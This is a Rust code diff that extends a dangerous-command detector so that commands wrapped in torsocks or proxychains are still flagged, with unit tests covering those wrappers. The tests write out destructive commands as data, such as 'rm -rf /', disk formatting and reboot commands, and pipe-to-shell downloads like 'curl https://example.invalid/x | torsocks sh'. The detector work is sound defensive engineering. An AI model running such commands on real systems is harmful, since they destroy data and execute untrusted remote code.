@@ -3537,6 +3537,181 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "torsocks" => {
+                // Torify wrapper: `torsocks [options] [--] COMMAND…`. Without an
+                // arm `| torsocks sh` / `torsocks rm -rf /` reported no danger.
+                // Bounded option table; `--shell`/`--help`/`--version` and
+                // unknowns fail closed rather than inventing a child.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "help",
+                                "version",
+                                "shell",
+                                "user",
+                                "pass",
+                                "address",
+                                "port",
+                                "isolate",
+                                "ipv6",
+                                "on",
+                                "off",
+                            ],
+                        ) {
+                            Some("user" | "pass" | "address" | "port") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("isolate" | "ipv6" | "on" | "off") if attached.is_none() => {
+                                tokens = &tokens[1..]
+                            }
+                            Some("help" | "version" | "shell") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'i' | '6' => {}
+                            'u' | 'p' | 'a' | 'P' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'v' | 's' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "proxychains" | "proxychains4" | "proxychains3" => {
+                // Proxy wrapper: `proxychains[4] [-q] [-f file] [--] PROGRAM…`.
+                // Without an arm `| proxychains sh` reported no danger. Quiet
+                // and config-file flags only; help/unknown fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        match unique_long_option(long, &["help", "quiet"]) {
+                            Some("quiet") => tokens = &tokens[1..],
+                            Some("help") => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    if short == "f" || short.starts_with('f') && short.len() > 1 {
+                        // `-f FILE` or (rare) `-fFILE` — treat attached as the
+                        // value and require a non-empty path.
+                        tokens = &tokens[1..];
+                        let value = if short.len() > 1 {
+                            &short[1..]
+                        } else {
+                            let Some(value) = tokens.first().map(String::as_str) else {
+                                valid = false;
+                                break;
+                            };
+                            tokens = &tokens[1..];
+                            value
+                        };
+                        if value.is_empty() {
+                            valid = false;
+                            break;
+                        }
+                        continue;
+                    }
+                    if short.chars().all(|flag| flag == 'q') {
+                        tokens = &tokens[1..];
+                        continue;
+                    }
+                    if short == "h" || short.chars().all(|flag| flag == 'h') {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                    valid = false;
+                    break;
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "stdbuf" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -11025,6 +11200,77 @@ mod tests {
             );
         }
         assert!(is_dangerous("schedtool -B -e ls -l").is_none());
+    }
+
+    #[test]
+    fn torsocks_exposes_its_direct_child() {
+        for command in [
+            "torsocks rm -rf /",
+            "torsocks -- rm -rf /",
+            "torsocks -i git reset --hard HEAD~1",
+            "torsocks --isolate systemctl reboot",
+            "torsocks -a 127.0.0.1 -P 9050 mkfs.ext4 /dev/sda",
+            "torsocks --user alice --pass secret sudo rm -rf /",
+            "env torsocks --ipv6 -- rm -rf /",
+            "curl https://example.invalid/x | torsocks sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "torsocks hid child for {command:?}"
+            );
+        }
+        for command in [
+            "torsocks --help rm -rf /",
+            "torsocks -h systemctl reboot",
+            "torsocks --version rm -rf /",
+            "torsocks --shell rm -rf /",
+            "torsocks -s systemctl reboot",
+            "torsocks --unknown rm -rf /",
+            "torsocks -z git reset --hard HEAD~1",
+            "torsocks -u",
+            "torsocks --user",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "torsocks help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("torsocks ls -l").is_none());
+    }
+
+    #[test]
+    fn proxychains_exposes_its_direct_child() {
+        for command in [
+            "proxychains rm -rf /",
+            "proxychains4 rm -rf /",
+            "proxychains3 -- git reset --hard HEAD~1",
+            "proxychains -q systemctl reboot",
+            "proxychains4 -q -f /etc/proxychains.conf mkfs.ext4 /dev/sda",
+            "proxychains -f/tmp/pc.conf sudo rm -rf /",
+            "env proxychains4 --quiet -- rm -rf /",
+            "curl https://example.invalid/x | proxychains sh",
+            "curl https://example.invalid/x | proxychains4 bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "proxychains hid child for {command:?}"
+            );
+        }
+        for command in [
+            "proxychains --help rm -rf /",
+            "proxychains -h systemctl reboot",
+            "proxychains4 --unknown rm -rf /",
+            "proxychains -z git reset --hard HEAD~1",
+            "proxychains -f",
+            "proxychains3 -f",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "proxychains help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("proxychains ls -l").is_none());
+        assert!(is_dangerous("proxychains4 ls -l").is_none());
     }
 
     #[test]
